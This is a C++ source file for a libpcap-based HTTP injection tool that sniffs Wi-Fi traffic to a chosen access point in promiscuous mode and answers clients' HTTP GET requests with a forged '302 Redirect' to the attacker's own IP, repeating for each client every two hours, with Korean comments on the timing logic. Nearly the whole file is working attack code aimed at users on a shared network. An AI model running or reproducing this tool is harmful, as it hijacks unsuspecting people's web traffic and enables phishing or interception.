#include <iostream>
#include "mac.h"
#include "key_value.h"
#include "http_injection.h"
#include <pcap.h>
#include <cstdio>
#include <map>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PCAP_OPENFLAG_PROMISCUOUS 1   // Even if it isn't my mac, receive packet

using namespace std;

struct pcap_pkthdr *pkt_header;
struct ether_header *eh;
struct ip *iph;
struct tcphdr *tcph;

struct user_info_value uiv;

char errbuf[PCAP_ERRBUF_SIZE];

void print_time(int input_time,struct timeval tv)
{
    int tm_hour, tm_min, tm_sec;
    int diff_t = tv.tv_sec - input_time;

    tm_hour = diff_t / (60*60);
    diff_t -= ( tm_hour *60 *60);
    tm_min = diff_t / 60;
    diff_t -= ( tm_min *60);
    tm_sec = diff_t;

    printf("%d시간 %d분 %d초",tm_hour,tm_min,tm_sec);
}

int main(int argc, char *argv[])
{
    const char f_rd[41] = "HTTP/1.0 302 Redirect\r\nLocation: http://";
    const char l_rd[5] = "\r\n\r\n";

    char *dev =  argv[1];
    uint8_t ap_mac[6];
    uint8_t attacker_mac[6];
    mac_changer(argv[3],ap_mac);
    char *send_dev = argv[2];
    char attacker_ip[16];
    int rd_length = 0;
    char rd_msg[80] = "0";
    uint32_t u32_attacker_ip;

    map<Mac,user_info_value>user_info;
    map<Mac,user_info_value>::iterator ui_iter;

    Mac user_mac;

    if(argc < 4)
        {
            printf("Input argument error!\n");
            if (dev == NULL)
            {
                printf("Input your <dev><send dev><AP_Mac_Address>\n");
                printf("EX : tap0 wlan0 AA:BB:CC:DD:EE:FF");
                exit(1);
            }
        }
        else
        {
        get_my_addr(send_dev,attacker_ip,attacker_mac);     //get my mac & ip address
        inet_pton(AF_INET,attacker_ip,&u32_attacker_ip);    //convert char to u32
        rd_length = strlen(attacker_ip);
        memcpy(rd_msg,f_rd,40);
        memcpy(rd_msg+40,attacker_ip,rd_length);
        memcpy(rd_msg+40+rd_length,l_rd,5);
        rd_length = strlen(rd_msg);

        printf("Monitor DEV : %s\n", dev);
        printf("Send DEV : %s\n", argv[2]);
        printf("AP_MAC : %s\n",argv[3]);
        printf("Sender_MAC :");
        for(int i=0;i<5;i++)
            printf("%02x:",attacker_mac[i]);
        printf("%02x\n",attacker_mac[5]);
        printf("Sender_IP : %s\n",attacker_ip);
        printf("Waiting http packet of Users...");


        const u_char *pkt_data;
        int res;
        int pkt_length;
        int jump_pointer;
        pcap_t *fp,*fp2;
        if((fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , -1, errbuf)) == NULL)
            {
                fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
            }
        else
        {
            if((fp2= pcap_open_live(send_dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , -1, errbuf)) == NULL)
                {
                    fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", send_dev);
                }
            while((res=pcap_next_ex(fp,&pkt_header,&pkt_data))>=-1)
            {
                if(res == 0)continue;
                if(res == -1)
                {
                    pcap_close(fp);
                    printf("%s is down, after 1sec, restart!\n",dev);
                    sleep(1);
                    if((fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , -1, errbuf)) == NULL)fprintf(stderr,"Unable to open the adapter. %s is not supported by Pcap\n", dev);
                    //pcap_datalink(fp);
                }
                else
                {
                    pkt_length = pkt_header->len;

                    eh = (struct ether_header*)pkt_data;

                    if(memcmp(eh->ether_dhost,ap_mac,6) == 0 || memcmp(eh->ether_shost,ap_mac,6) ==0)
                    {
                        if(memcmp(eh->ether_dhost,ap_mac,6) == 0)
                            memcpy(user_mac.mac_address,eh->ether_shost,6);
                        else
                            memcpy(user_mac.mac_address,eh->ether_dhost,6);
                        pkt_data += sizeof(struct ether_header);
                        pkt_length -= sizeof(struct ether_header);

                        if((ui_iter = user_info.find(user_mac)) != user_info.end())
                        {
                            int bl_hour;
                            int diff_t = pkt_header->ts.tv_sec - ui_iter->second.block_time;
                            bl_hour = diff_t / (60*60);
                            diff_t -= ( bl_hour *60 *60);

                            if(bl_hour>1)   //http_injection이 실행된 지 2시간이 경과했으면 실행
                            {
                                uint16_t etype = ntohs(eh->ether_type);
                                if(etype == ETHERTYPE_IP)
                                {
                                    iph = (struct ip*)pkt_data;
                                    pkt_data += iph->ip_hl*4;
                                    pkt_length -= iph->ip_hl*4;
                                    if(iph->ip_p == IPPROTO_TCP)
                                    {
                                        tcph = (struct tcphdr*)pkt_data;
                                        pkt_data += tcph->doff*4;
                                        pkt_length -= tcph->doff*4;
                                        jump_pointer = sizeof(struct ether_header)+iph->ip_hl*4+tcph->doff*4;
                                        if(pkt_length > 0 && iph->ip_dst.s_addr != u32_attacker_ip) //목적지 ip 주소가 공격자의 주소가 아닐 경우에만 실행
                                        {
                                            u_int32_t *u32_get;
                                            u32_get = (u_int32_t*)pkt_data;
                                            if(ntohl(*u32_get) == 0x47455420)      //TCP DATA가 GET 일경우
                                            {
                                                pkt_data -= jump_pointer;   //http_injection을 하기 위해서 패킷 포인터를 원래대로 셋팅한다
                                                pkt_length += jump_pointer;
                                                if(http_injection(fp2,pkt_data,pkt_length,attacker_mac,rd_msg,rd_length)==1)
                                                    //ui_iter->second.block_time = pkt_header->ts.tv_sec; //http_injection의 정상 실행됐을 경우, block_time을 실행한 시간으로 갱신한다.
                                                    printf("a\n");
                                            }
                                        }
                                    }
                                }
                            }
                            ui_iter->second.last_time = pkt_header->ts.tv_sec;  //마지막으로 연결된 이후의 시간을 패킷이 들어온 시간으로 갱신한다.
                        }
                        else
                        {
                            uiv.block_time = pkt_header->ts.tv_sec-7200;     //http 패킷 탐지시 실행되게끔 block time을 현재보다 2시간 이후로 설정
                            uiv.last_time = pkt_header->ts.tv_sec;      //last_time을 패킷이 들어온 시간으로 설정
                            user_info.insert(pair<Mac, user_info_value>(user_mac,uiv));
                        }   //user_mac이 없을 경우, MAP에 추가하는 else문
                    }   //ap mac주소가 일치하는지 if문
                }   //패킷을 정상적으로 받아 왔을 경우 실행되는 else문
//                sleep(1);
/*                system("clear");
                cout<<"User_Mac\t\tAfter Block Time\tLast Connection Time"<<endl;
                for(ui_iter = user_info.begin(); ui_iter!=user_info.end(); advance(ui_iter,1))
                {
                    if(pkt_header->ts.tv_sec - ui_iter->second.last_time > 1800)    //마지막으로 연결된 이후의 시간이 30분이 지나면 해당 MAP을 삭제한다
                        user_info.erase(ui_iter++);
                    for(int i=0;i<5;i++)
                        printf("%02x:",ui_iter->first.mac_address[i]); //beacon info key(bssid)
                    printf("%02x\t",ui_iter->first.mac_address[5]);
                    print_time(ui_iter->second.block_time,pkt_header->ts);  //http_injection 이 실행된 이후의 시간을 출력
                    cout<<"\t\t";
                    print_time(ui_iter->second.last_time,pkt_header->ts);   //마지막으로 연결된 이후의 시간을 출력
                    cout<<endl;
                }*/
            }   //pcap_next_ex 함수 while문
        }   //pcap_open의 반환값이 0 이상일 경우 실행되는 else문
    }   //tap0에 정상적으로 패킷이 유입될 경우 실행되는 else문
    return 0;
}
